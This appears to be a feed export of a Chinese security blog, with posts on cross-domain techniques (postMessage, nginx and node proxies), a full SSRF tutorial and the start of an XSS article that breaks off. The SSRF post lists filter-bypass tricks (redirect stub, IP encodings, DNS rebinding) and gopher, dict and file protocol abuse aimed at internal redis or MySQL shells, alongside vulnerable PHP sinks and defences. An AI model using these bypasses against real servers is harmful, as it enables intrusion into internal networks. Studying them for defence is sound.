处理后再发回domain1</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.parent.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain1.com'</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>message 的属性有:</strong></p><ul><li><p><strong>data</strong><br>从其他 window 中传递过来的对象。</p></li><li><p><strong>origin</strong><br>调用 postMessage  时消息发送方窗口的 origin . 这个字符串由 协议、“://“、域名、“ : 端口号”拼接而成。例如 “<code>https://example.org</code> (隐含端口 443)”、“<code>http://example.net</code> (隐含端口 80)”、“<code>http://example.com:8080</code>”。请注意，这个origin不能保证是该窗口的当前或未来origin，因为postMessage被调用后可能被导航到不同的位置。</p><p>当发送窗口包含 <code>javascript:</code> 或 <code>data:</code> URL时，origin属性的值是加载URL的脚本的</p></li><li><p><strong>source</strong><br>对发送消息的窗口对象的引用; 您可以使用此来在具有不同origin的两个窗口之间建立双向通信。</p></li></ul><p><strong>原理分析：</strong></p><p>a.html通过加载不同域的b.html，通过<code>postMessage</code>方法发送数据，同时设置事件监听器来监听返回数据</p><p>b.html也同样设置事件监听器来监听来自a.html的数据，得到数据后通过<code>window.parent.postMessage</code>发送数据返回</p><p><strong>安全性：</strong></p><ul><li><p>如果您不希望从其他网站接收message，请不要为message事件添加任何事件侦听器。 </p></li><li><p>如果您确实希望从其他网站接收message，请始终使用origin和source属性验证发件人的身份。 任何窗口（包括例如<code>http://evil.example.com</code>）都可以向任何其他窗口发送消息，并且您不能保证未知发件人不会发送恶意消息。 但是，验证身份后，您仍然应该始终验证接收到的消息的语法。 否则，您信任只发送受信任邮件的网站中的安全漏洞可能会在您的网站中打开跨网站脚本漏洞。</p></li></ul><ul><li>当您使用postMessage将数据发送到其他窗口时，始终指定精确的目标origin，而不是<code>*</code>。 恶意网站可以在您不知情的情况下更改窗口的位置，因此它可以拦截使用postMessage发送的数据。</li></ul><h1 id="nginx代理跨域"><a href="#nginx代理跨域" class="headerlink" title="nginx代理跨域"></a>nginx代理跨域</h1><h2 id="nginx配置解决iconfont跨域"><a href="#nginx配置解决iconfont跨域" class="headerlink" title="nginx配置解决iconfont跨域"></a>nginx配置解决iconfont跨域</h2><p>浏览器跨域访问js、css、img等常规静态资源被同源策略许可，但iconfont字体文件(eot|otf|ttf|woff|svg)例外，此时可在nginx的静态资源服务器中加入以下配置。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">  <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nginx反向代理接口跨域"><a href="#nginx反向代理接口跨域" class="headerlink" title="nginx反向代理接口跨域"></a>nginx反向代理接口跨域</h2><p><strong>实现思路：</strong></p><p>通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。</p><p><strong>Nginx配置：</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#proxy服务器</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">81</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  www.domain1.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span>   http://www.domain2.com:8080;  <span class="comment">#反向代理</span></span><br><span class="line">        <span class="attribute">proxy_cookie_domain</span> www.domain2.com www.domain1.com; <span class="comment">#修改cookie里域名</span></span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用</span></span><br><span class="line">        <span class="attribute">add_header</span> Access-Control-Allow-Origin http://www.domain1.com;  <span class="comment">#当前端只跨域不带cookie时，可为*</span></span><br><span class="line">        <span class="attribute">add_header</span> Access-Control-Allow-Credentials <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>前端代码：</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端开关：浏览器是否读写cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问nginx中的代理服务器</span></span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'http://www.domain1.com:81/?user=admin'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p><strong>Nodejs后台：</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line"><span class="keyword">var</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> params = qs.parse(req.url.substring(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向前台写cookie</span></span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Set-Cookie'</span>: <span class="string">'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'</span>   <span class="comment">// HttpOnly:脚本无法读取</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.write(<span class="built_in">JSON</span>.stringify(params));</span><br><span class="line">    res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br></pre></td></tr></table></figure><h1 id="nodejs中间件代理跨域"><a href="#nodejs中间件代理跨域" class="headerlink" title="nodejs中间件代理跨域"></a>nodejs中间件代理跨域</h1><p>原理与<code>Nginx</code>一致，都是通过代理服务器实现数据的转发</p><p>前台与后台和<code>Nginx</code>一致</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> proxy = <span class="built_in">require</span>(<span class="string">'http-proxy-middleware'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/'</span>, proxy(&#123;</span><br><span class="line">    <span class="comment">// 代理跨域目标接口</span></span><br><span class="line">    target: <span class="string">'http://www.domain2.com:8080'</span>,</span><br><span class="line">    changeOrigin: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改响应头信息，实现跨域并允许带cookie</span></span><br><span class="line">    onProxyRes: <span class="function"><span class="keyword">function</span>(<span class="params">proxyRes, req, res</span>) </span>&#123;</span><br><span class="line">        res.header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'http://www.domain1.com'</span>);</span><br><span class="line">        res.header(<span class="string">'Access-Control-Allow-Credentials'</span>, <span class="string">'true'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改响应信息中的cookie域名</span></span><br><span class="line">    cookieDomainRewrite: <span class="string">'www.domain1.com'</span>  <span class="comment">// 可以为false，表示不修改</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Proxy server is listen at port 3000...'</span>);</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://segmentfault.com/a/1190000011145364" target="_blank" rel="noopener">前端常见跨域解决方案（全）</a></p><p><a href="https://blog.csdn.net/qq_17175013/article/details/89115400" target="_blank" rel="noopener">【9大跨域解决方案】location.hash解决跨域的原理</a></p><p><a href="https://blog.csdn.net/qq_17175013/article/details/89165586" target="_blank" rel="noopener">【9大跨域解决方案】postMessage解决跨域的原理</a></p><p><a href="https://blog.csdn.net/qq_17175013/article/details/89165586" target="_blank" rel="noopener">【9大跨域解决方案】postMessage解决跨域的原理</a></p><p><a href="https://blog.csdn.net/qq_17175013/article/details/89007334" target="_blank" rel="noopener">【9大跨域解决方案】window.name解决跨域的原理</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; &lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;除了常见跨域CORS、JSONP、WebSocket外的其他跨域方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;document.domain + iframe跨域&lt;/li&gt;
&lt;li&gt;location.hash + iframe跨域&lt;/li&gt;
&lt;li&gt;window.name + iframe跨域&lt;/li&gt;
&lt;li&gt;postMessage跨域&lt;/li&gt;
&lt;li&gt;nginx代理跨域&lt;/li&gt;
&lt;li&gt;nodejs中间件代理跨域&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="前端安全" scheme="https://a2u13.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="跨域方案" scheme="https://a2u13.com/tags/%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/"/>
    
  </entry>
  
  <entry>
    <title>SSRF大汇总</title>
    <link href="https://a2u13.com/2020/03/27/SSRF%E5%A4%A7%E6%B1%87%E6%80%BB/"/>
    <id>https://a2u13.com/2020/03/27/SSRF%E5%A4%A7%E6%B1%87%E6%80%BB/</id>
    <published>2020-03-27T13:54:20.000Z</published>
    <updated>2020-06-07T06:28:28.924Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>SSRF的Bypass、利用方法以及如何面对无回显SSRF</p><a id="more"></a><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="绕过白名单"><a href="#绕过白名单" class="headerlink" title="绕过白名单"></a>绕过白名单</h2><p>寻找白名单域中的重定向漏洞，或者寻找白名单的设置不当问题（如正则编写不规范）</p><h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><h3 id="302重定向"><a href="#302重定向" class="headerlink" title="302重定向"></a>302重定向</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;？php header（“location：http：<span class="comment">//127.0.0.1”）;？&gt;</span></span><br></pre></td></tr></table></figure><p>托管到自己的<code>VPS</code>即可</p><p>或者短连接进行302跳转</p><h3 id="修改文件上传类型"><a href="#修改文件上传类型" class="headerlink" title="修改文件上传类型"></a>修改文件上传类型</h3><p>如上传图片，修改<code>type</code>为<code>url</code>,测试服务器是否发送请求</p><h3 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h3><p>把自己的域名的A记录解析到<code>127.0.0.1</code>，然后服务端在进行DNS解析后，返回访问<code>127.0.0.1</code>的数据</p><p><strong>xip.io</strong></p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//xip.io/</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328183020067.png" alt="image-20200328183020067"></p><p>原理是<code>xip.io</code>为英特网上的<code>DNS Server</code>，他会对你访问的地址进行重定向</p><h3 id="使用IPv6地址"><a href="#使用IPv6地址" class="headerlink" title="使用IPv6地址"></a>使用IPv6地址</h3><p>如果服务端没有对<code>IPv6</code>进行过滤的话，就可以利用<code>IPv6</code>绕过</p><h3 id="使用句号代替逗号"><a href="#使用句号代替逗号" class="headerlink" title="使用句号代替逗号"></a>使用句号代替逗号</h3><p>这里没法截图，反正在URL输入会自动转变为句号</p><h3 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.<span class="keyword">com</span></span><br><span class="line">Lis<span class="variable">t:</span></span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -&gt; <span class="number">0x7f</span><span class="number">.0</span>x0<span class="number">.0</span>x0<span class="number">.0</span>x1</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328181519171.png" alt="image-20200328181519171"></p><h4 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -&gt; <span class="number">0177.0</span><span class="number">.0</span><span class="number">.01</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328181613270.png" alt="image-20200328181613270"></p><h4 id="IP地址转Int整型"><a href="#IP地址转Int整型" class="headerlink" title="IP地址转Int整型"></a>IP地址转Int整型</h4><p><a href="http://www.jsons.cn/ipnum/" target="_blank" rel="noopener">http://www.jsons.cn/ipnum/</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328181826832.png" alt="image-20200328181826832"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328181911646.png" alt="image-20200328181911646"></p><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">localhost -&gt; ％<span class="number">6</span>c％<span class="number">6f</span>％<span class="number">63</span>％<span class="number">61</span>％<span class="number">6</span>c％<span class="number">68</span>％<span class="number">6f</span>％<span class="number">73</span>％<span class="number">74</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328182109966.png" alt="image-20200328182109966"></p><h4 id="各种进制混合"><a href="#各种进制混合" class="headerlink" title="各种进制混合"></a>各种进制混合</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -&gt; <span class="number">0177.0</span><span class="number">.0</span><span class="number">.0</span>x1</span><br></pre></td></tr></table></figure><h1 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328195537401.png" alt="image-20200328195537401"></p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>顾名思义，用来读取文件的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328195644819.png" alt="image-20200328195644819"></p><h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>用来探测端口开放状态，比如这里探测3306端口的服务</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328200455275.png" alt="image-20200328200455275"></p><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>可以用来发送HTTP请求，用来攻击内网<code>redis</code>等服务</p><p>举个例子</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328201022227.png" alt="image-20200328201022227"></p><p>这里得注意，需要把<code>\r\n</code>编码为<code>%0d%0a</code>之后发送，如果在<code>URL</code>里的话，还需要进行二次编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">s=<span class="string">'xxxx'</span></span><br><span class="line">len=len(s)</span><br><span class="line">p=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len)[::<span class="number">2</span>]:</span><br><span class="line">    p+=urllib.parse.quote(chr(int(s[i:i+<span class="number">2</span>],<span class="number">16</span>)))</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure><p>通过<code>WireShark</code>抓包后导出原始数据，然后用脚本转换即可</p><p>一般用来配合<code>Mysql</code>无密码认证登录然后写入shell或者<code>UDF提权</code>来反弹shell使用</p><p>也可以<code>redis</code>未授权访问然后反弹shell，需要Wireshark来抓取数据包手动构造</p><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl_exec 默认不 follow 302 跳转</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li><li>file_get_contents() // file_get_contents支持php://input协议</li><li>curl在请求 <code>http://127.0.0.1/1.php?.jpg</code>，那么我们访问的内容就是1.php,而不是名称为<code>1.php?.jpg</code>的文件</li></ul><h1 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h1><ol><li>PHP fsockopen</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">        <span class="keyword">if</span> (!$fp) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">            $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">            $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">            $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">            fwrite($fp, $out); </span><br><span class="line">            $contents=<span class="string">''</span>; </span><br><span class="line">            <span class="keyword">while</span> (!feof($fp)) &#123; </span><br><span class="line">                $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>PHP file_get_contents</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">    &#123; </span><br><span class="line">        $content = file_get_contents($_POST[<span class="string">'url'</span>]); </span><br><span class="line">        $filename = <span class="string">'./images/'</span>.rand().<span class="string">'img1.jpg'</span>; </span><br><span class="line">        file_put_contents($filename, $content); </span><br><span class="line">        <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>].<span class="string">""</span>; </span><br><span class="line">        $img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">echo</span> $img; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>PHP curl_exec</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $link = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $curlobj = curl_init();</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">        curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $result=curl_exec($curlobj);</span><br><span class="line">        curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">        $filename = <span class="string">'./curled/'</span>.rand().<span class="string">'.txt'</span>;</span><br><span class="line">        file_put_contents($filename, $result); </span><br><span class="line">        <span class="keyword">echo</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>PHP fopen</li><li></li></ol><h1 id="无回显SSRF"><a href="#无回显SSRF" class="headerlink" title="无回显SSRF"></a>无回显SSRF</h1><p><strong>思路：</strong></p><ol><li>先探测端口开放情况，然后确定开放以后进行服务识别</li><li>构造响应服务的漏洞payload进行测试</li></ol><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328211228700.png" alt="image-20200328211228700"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.禁止302跳转，或者每次跳转进行检查</p><p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>3.禁用不需要的协议，仅仅允许<code>http</code>和<code>https</code>请求。可以防止类似于<code>file://</code>,<code>gopher://</code>, <code>ftp://</code> 等引起的问题</p><p>4.设置URL白名单或者限制内网IP（使用<code>gethostbyname()</code>判断是否为内网IP）</p><p>5.限制请求的端口为http常用的端口，比如 <code>80、443、8080、8090</code></p><p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328205252770.png" alt="image-20200328205252770"></p><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><p><a href="https://xz.aliyun.com/t/7405" target="_blank" rel="noopener">SSRF漏洞的利用与攻击内网应用实战</a></p><p><a href="https://xz.aliyun.com/t/6207" target="_blank" rel="noopener">绕过SSRF包含</a></p><p><a href="https://xz.aliyun.com/t/4420" target="_blank" rel="noopener">CTF中SSRF的一些trick</a></p><p><a href="https://xz.aliyun.com/t/6373" target="_blank" rel="noopener">SSRF在有无回显方面的利用及其思考与总结</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SSRF的Bypass、利用方法以及如何面对无回显SSRF&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞研究" scheme="https://a2u13.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="SSRF" scheme="https://a2u13.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>从浏览器编码看XSS的攻击与防御</title>
    <link href="https://a2u13.com/2020/03/27/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E7%A0%81%E7%9C%8BXSS%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>https://a2u13.com/2020/03/27/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E7%A0%81%E7%9C%8BXSS%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</id>
    <published>2020-03-27T10:51:48.000Z</published>
    <updated>2020-06-07T06:28:28.875Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>从浏览器编码解码的角度看待XSS是怎么产生的以及我们应该怎么防御XSS</p><a id="more"></a><h1 id="浏览器的编码与解码"><a href="#浏览器的编码与解码" class="headerlink" title="浏览器的编码与解码"></a>浏览器的编码与解码</h1><p>浏览器对一个<code>HTML</code>文档进行解析的时候，会有<code>HTML</code>解析器、<code>URL</code>解析器以及<code>JavaScript</code>解码器同时工作参与解码的任务</p><h2 id="HTML解码器"><a href="#HTML解码器" class="headerlink" title="HTML解码器"></a>HTML解码器</h2><p>作为HTML解析器，它实际上是以状态机的形式存在，下面是HTML解析器在词性分析方面的一个<code>WiKi</code>，受限于国内环境，打开可能会有点缓慢，建议挂梯子打开</p><p><a href="https://html.spec.whatwg.org/multipage/parsing.html" target="_blank" rel="noopener">https://html.spec.whatwg.org/multipage/parsing.html</a></p><p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。</p><p>在解析过程中，任何时候它只要遇到一个’&lt;’符号（后面没有跟’/‘符号&#60;&#62;&#38;&#34;&#39;）就会进入“标签开始状态(<code>Tag open state</code>)”。</p><p>然后转变到“标签名状态(<code>Tag name state</code>)”，“前属性名状态(<code>before attribute name state</code>)”……最后进入“数据状态(<code>Data state</code>)”并释放当前标签的<code>token</code>。</p><p>当解析器处于“数据状态(<code>Data state</code>)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个<code>token</code>。</p><p>这里有三种情况可以容纳字符实体，“<strong>数据状态中的字符引用</strong>”，“<strong>RCDATA状态中的字符引用</strong>”和“<strong>属性值状态中的字符引用</strong>”。在这些状态中HTML字符实体将会从“&amp;#…”形式解码，对应的解码字符会被放入数据缓冲区中。</p><p>当一个标签后面的如<code>&lt;div&gt;</code>后面的<code>&amp;#60;</code> 被解码后，实际上会产生<code>&lt;</code>，但此时不会进入标签开始状态，因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”。</p><h3 id="字符实体-character-entities"><a href="#字符实体-character-entities" class="headerlink" title="字符实体(character entities)"></a>字符实体(character entities)</h3><p>字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开始，后面跟着一个预定义的实体的名称，或是一个#符号以及字符的十进制数字。</p><h3 id="HTML字符实体-HTML-character-entities"><a href="#HTML字符实体-HTML-character-entities" class="headerlink" title="HTML字符实体(HTML character entities)"></a>HTML字符实体(HTML character entities)</h3><p>通常会对<code>&lt;、&gt;、&amp;、&quot;、&#39;</code>做实体处理</p><table><thead><tr><th align="center">原始符号</th><th align="center">实体名称</th><th align="center">实体编码</th></tr></thead><tbody><tr><td align="center">&lt;</td><td align="center"><code>&amp;lt;</code></td><td align="center"><code>&amp;#60;</code></td></tr><tr><td align="center">&gt;</td><td align="center"><code>&amp;gt;</code></td><td align="center"><code>&amp;#62;</code></td></tr><tr><td align="center">&amp;</td><td align="center"><code>&amp;amp;</code></td><td align="center"><code>&amp;#38;</code></td></tr><tr><td align="center">“</td><td align="center"><code>&amp;quot;</code></td><td align="center"><code>&amp;#34;</code></td></tr><tr><td align="center">‘</td><td align="center"><code>&amp;apos;</code></td><td align="center"><code>&amp;#39;</code></td></tr></tbody></table><p><strong>在HTML中有五类元素：</strong></p><ol><li><p>空元素(<code>Void elements</code>)，如<code>&lt;area&gt;,&lt;br&gt;,&lt;base&gt;</code>等等</p></li><li><p>原始文本元素(<code>Raw text elements</code>)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p></li><li><p>RCDATA元素(<code>RCDATA elements</code>)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></p></li><li><p>外部元素(<code>Foreign 